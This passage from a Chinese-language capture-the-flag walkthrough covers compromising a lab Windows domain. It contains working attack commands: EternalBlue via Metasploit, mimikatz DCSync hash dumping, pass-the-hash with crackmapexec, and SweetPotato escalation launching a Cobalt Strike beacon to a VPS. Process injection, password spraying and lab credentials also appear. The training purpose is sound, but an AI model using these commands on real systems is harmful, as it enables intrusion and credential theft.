+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003935500.png"
+	width="1284"
+	height="872"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003935500_hu5287756486877636604.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003935500_hu2257959423998010799.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311003935500"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="147"
+		data-flex-basis="353px"
+	
+></p>
+<p>system权限查找flag2</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003958474.png"
+	width="1284"
+	height="872"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003958474_hu5508343720272887644.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311003958474_hu11706472460266306994.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311003958474"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="147"
+		data-flex-basis="353px"
+	
+></p>
+<p>这里提示要攻击DC，我们先去把剩下的172.22.1.21打了</p>
+<p>前面扫出来MS17-010永恒之蓝漏洞，这里用kali打吧，自带msf,还是要先配代理</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">vim /etc/proxychains4.conf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>配上之后启动msf</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311004354714.png"
+	width="1430"
+	height="666"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311004354714_hu14630276729002502212.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311004354714_hu9414735273179784572.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311004354714"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="214"
+		data-flex-basis="515px"
+	
+></p>
+<p>用第一个</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 msfconsole
+</span></span><span class="line"><span class="cl">use exploit/windows/smb/ms17_010_eternalblue
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> payload windows/x64/meterpreter/bind_tcp_uuid
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> RHOSTS 172.22.1.21
+</span></span><span class="line"><span class="cl">exploit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311004607962.png"
+	width="949"
+	height="441"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311004607962_hu17164734303026734741.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311004607962_hu4098218789655076114.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311004607962"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="215"
+		data-flex-basis="516px"
+	
+></p>
+<p>打成功了，mimikatz收集域内hash</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">load kiwi  
+</span></span><span class="line"><span class="cl">kiwi_cmd <span class="s2">&#34;lsadump::dcsync /domain:xiaorang.lab /all /csv&#34;</span> <span class="nb">exit</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>dump出域内所有的hash</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311004904141.png"
+	width="800"
+	height="305"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311004904141_hu15826039864575787655.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311004904141_hu6548196626560524770.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311004904141"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="262"
+		data-flex-basis="629px"
+	
+></p>
+<p>直接用Administrator的hash，这里用<code>crackmapexec</code>调用命令拿flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="s2">&#34;type Users\Administrator\flag\flag03.txt&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311005040241.png"
+	width="1376"
+	height="409"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311005040241_hu16022982023623495905.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311005040241_hu14935428638980388087.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311005040241"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="336"
+		data-flex-basis="807px"
+	
+></p>
+<h2 id="tsclient">Tsclient
+</h2><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311135729578.png"
+	width="1483"
+	height="762"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311135729578_hu10799015851353469967.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311135729578_hu13067775994236740107.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311135729578"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="194"
+		data-flex-basis="467px"
+	
+></p>
+<p>mssql用MDUT连接</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311140116487.png"
+	width="1009"
+	height="841"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311140116487_hu18365378234883396677.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311140116487_hu114244741506661915.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311140116487"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="119"
+		data-flex-basis="287px"
+	
+></p>
+<p>低权限用户,这里考虑potato系列提权然后连cs上线，先在vps上整好cs</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311142530190.png"
+	width="1272"
+	height="407"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311142530190_hu6427441475999652637.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311142530190_hu2498493438431321230.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311142530190"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="312"
+		data-flex-basis="750px"
+	
+></p>
+<p>然后本机配上ip和用户名密码就行</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311142559238.png"
+	width="1920"
+	height="1030"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311142559238_hu2051772097017333319.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311142559238_hu12560461159162985178.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311142559238"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="447px"
+	
+></p>
+<p>然后现在用cs生成一个监听exe</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311142934513.png"
+	width="472"
+	height="612"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311142934513_hu11842421432651180645.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311142934513_hu14134782263166454983.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311142934513"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="77"
+		data-flex-basis="185px"
+	
+></p>
+<p>这里端口可以换成别的，80端口被占用这里起不了，起完监听之后这里生成windows payload</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311143317895.png"
+	width="363"
+	height="261"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311143317895_hu8207484285408060161.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311143317895_hu8694867163077104883.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311143317895"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="139"
+		data-flex-basis="333px"
+	
+></p>
+<p>会生成一个木马，我们去找potato的工具一起上传到靶机，这里用printspoofer或者sweetpotato提权</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311143917086.png"
+	width="1009"
+	height="841"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311143917086_hu15400636499582467341.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311143917086_hu3862375045023072306.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311143917086"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="119"
+		data-flex-basis="287px"
+	
+></p>
+<p>然后用这个启动我们生成的cs payload上线cs</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:/Windows/Temp/SweetPotato.exe -a <span class="s2">&#34;C:/Windows/Temp/artifact.exe&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311144100455.png"
+	width="784"
+	height="592"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311144100455_hu17544597812484776740.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311144100455_hu13939539050537859254.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311144100455"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="132"
+		data-flex-basis="317px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">shell <span class="nb">type</span> C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\f</span>lag<span class="se">\f</span>lag01.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311144658295.png"
+	width="841"
+	height="455"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311144658295_hu854542640947151690.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311144658295_hu7164081085125387987.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311144658295"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="184"
+		data-flex-basis="443px"
+	
+></p>
+<p>上传fscan进行内网扫描</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311145433316.png"
+	width="1009"
+	height="841"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311145433316_hu8866888318960375147.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311145433316_hu13043625548585304648.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311145433316"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="119"
+		data-flex-basis="287px"
+	
+></p>
+<p>这里结果全是乱码，还是去cs里面执行吧</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">shell C:/Windows/Temp/fscan.exe -h 172.22.8.0/24 -o C:/Windows/Temp/res.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里输出到txt里面方便查看,这里的结果会下载到vps上</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[2026-03-11 15:07:25] [SERVICE] 目标:172.22.8.46 状态:identified 详情:title=IIS Windows Server, Url=http://172.22.8.46, status_code=200, length=703, server_info=map[accept-ranges:bytes content-length:703 content-type:text/html date:Wed, 11 Mar 2026 07:07:25 GMT etag:&#34;687a619b3595d81:0&#34; last-modified:Mon, 11 Jul 2022 14:50:48 GMT length:703 server:Microsoft-IIS/10.0 status_code:200 title:IIS Windows Server], fingerprints=[], port=80, service=http
+</span></span><span class="line"><span class="cl">[2026-03-11 15:07:25] [SERVICE] 目标:172.22.8.46 状态:identified 详情:hostname=WIN2016, ipv4=[172.22.8.46], ipv6=[]
+</span></span><span class="line"><span class="cl">[2026-03-11 15:07:25] [SERVICE] 目标:172.22.8.18 状态:identified 详情:hostname=WIN-WEB, ipv4=[172.22.8.18], ipv6=[2001:0:14c9:d206:18b3:2584:d89c:1fa4]
+</span></span><span class="line"><span class="cl">[2026-03-11 15:07:25] [SERVICE] 目标:172.22.8.15 状态:identified 详情:port=139, domain_name=XIAORANG, workstation_service=DC01, server_service=DC01, domain_controllers=XIAORANG
+</span></span><span class="line"><span class="cl">[2026-03-11 15:07:25] [SERVICE] 目标:172.22.8.31 状态:identified 详情:port=139, domain_name=XIAORANG, workstation_service=WIN19-CLIENT, server_service=WIN19-CLIENT
+</span></span><span class="line"><span class="cl">[2026-03-11 15:07:25] [SERVICE] 目标:172.22.8.31 状态:identified 详情:ipv4=[172.22.8.31], ipv6=[], hostname=WIN19-CLIENT
+</span></span><span class="line"><span class="cl">[2026-03-11 15:07:25] [SERVICE] 目标:172.22.8.15 状态:identified 详情:hostname=DC01, ipv4=[172.22.8.15], ipv6=[]
+</span></span><span class="line"><span class="cl">[2026-03-11 15:07:25] [SERVICE] 目标:172.22.8.46 状态:identified 详情:computer_name=WIN2016.xiaorang.lab, domain_name=xiaorang.lab, netbios_domain=XIAORANG, netbios_computer=WIN2016, workstation_service=WIN2016, server_service=WIN2016, os_version=Windows Server 2016 Datacenter 14393, port=139
+</span></span><span class="line"><span class="cl">[2026-03-11 15:07:26] [SERVICE] 目标:172.22.8.18 状态:identified 详情:Url=http://172.22.8.18, status_code=200, length=703, server_info=map[accept-ranges:bytes content-length:703 content-type:text/html date:Wed, 11 Mar 2026 07:07:26 GMT etag:&#34;de472b34195d81:0&#34; last-modified:Mon, 11 Jul 2022 08:35:41 GMT length:703 server:Microsoft-IIS/10.0 status_code:200 title:IIS Windows Server], fingerprints=[], port=80, service=http, title=IIS Windows Server
+</span></span><span class="line"><span class="cl">[2026-03-11 15:07:33] [VULN] 目标:172.22.8.18 状态:vulnerable 详情:port=1433, service=mssql, username=sa, password=1qaz!QAZ, type=weak-password
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>没啥打的，总结一下信息</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">172.22.8.15 XIAORANG\DC01 # 域控
+</span></span><span class="line"><span class="cl">172.22.8.31 XIAORANG\WIN19-CLIENT
+</span></span><span class="line"><span class="cl">172.22.8.46 WIN2016.xiaorang.lab
+</span></span><span class="line"><span class="cl">172.22.8.18 WIN-WEB # 本机
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>枚举用户信息</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311151747767.png"
+	width="569"
+	height="221"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311151747767_hu431437481226424206.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311151747767_hu2057503527793258287.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311151747767"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="257"
+		data-flex-basis="617px"
+	
+></p>
+<p>John这个用户是admin，查看一下</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311151927298.png"
+	width="747"
+	height="538"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311151927298_hu8548837986836996130.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311151927298_hu1209635590178481098.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311151927298"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="138"
+		data-flex-basis="333px"
+	
+></p>
+<p>其实可以直接查看在线用户</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">shell quser <span class="o">||</span> qwinst <span class="c1">#查看在线用户</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311151946171.png"
+	width="659"
+	height="137"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311151946171_hu7612709914705542929.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311151946171_hu830468590209227997.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311151946171"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="481"
+		data-flex-basis="1154px"
+	
+></p>
+<p>rdp远程连接，可以用cs进程注入</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311152318164.png"
+	width="1920"
+	height="1030"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311152318164_hu6951523928595114673.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311152318164_hu474442908042670544.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311152318164"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="447px"
+	
+></p>
+<p>选择John用户的svchost进程注入</p>
+<p>上线之后查看共享资源</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311152646394.png"
+	width="1008"
+	height="285"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311152646394_hu3130402798251276536.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311152646394_hu5682007167082319749.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311152646394"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="353"
+		data-flex-basis="848px"
+	
+></p>
+<p>发现TSClient,利用这个列目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell dir \\TSCLIENT\C
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311152854798.png"
+	width="560"
+	height="356"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311152854798_hu15549541594987939468.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311152854798_hu3109101560981027865.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311152854798"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="157"
+		data-flex-basis="377px"
+	
+></p>
+<p>发现credential.txt，查看一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">shell <span class="nb">type</span> <span class="se">\\</span>TSCLIENT<span class="se">\C\c</span>redential.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311153000711.png"
+	width="691"
+	height="147"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311153000711_hu454220227132612631.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311153000711_hu8592593815816952818.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311153000711"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="470"
+		data-flex-basis="1128px"
+	
+></p>
+<p>发现一个域用户的账号密码，以及提示镜像挟持</p>
+<p>这里直接用cs搭建隧道，配置proxychains,这里用socks5</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311153859612.png"
+	width="660"
+	height="71"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311153859612_hu18359856041210398771.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311153859612_hu10243834128645440830.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311153859612"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="929"
+		data-flex-basis="2230px"
+	
+></p>
+<p>然后用kali进行密码喷洒,就是撞库</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311153942288.png"
+	width="1401"
+	height="179"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311153942288_hu6424081372485498448.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311153942288_hu16637576961515760488.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311153942288"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="782"
+		data-flex-basis="1878px"
+	
+></p>
+<p>撞到WIN2016、WIN19-CLIENT、DC01这三个</p>
+<p>这里修改WIN2016这台机子的密码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 -q impacket-changepasswd xiaorang.lab/Aldrich:<span class="s1">&#39;Ald@rLMWuy7Z!#&#39;</span>@172.22.8.46 -newpass <span class="s1">&#39;0d00@0721&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是报错说密码已失效，这里选择直接图形化修改密码了,登入WIN19-CLIENT这台试试</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p <span class="s1">&#39;Ald@rLMWuy7Z!#&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我把密码修改成<code>0d00@0721</code>，然后现在显示</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311161153655.png"
+	width="997"
+	height="713"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311161153655_hu14393604386868258297.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311161153655_hu10004977244478345636.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311161153655"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="139"
+		data-flex-basis="335px"
+	
+></p>
+<p>换46那台登入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 rdesktop 172.22.8.46 -u Aldrich -d xiaorang.lab -p <span class="s1">&#39;0d00@0721&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311161526455.png"
+	width="1003"
+	height="582"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311161526455_hu14713080139033372940.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311161526455_hu8925349049538107837.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311161526455"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="172"
+		data-flex-basis="413px"
+	
+></p>
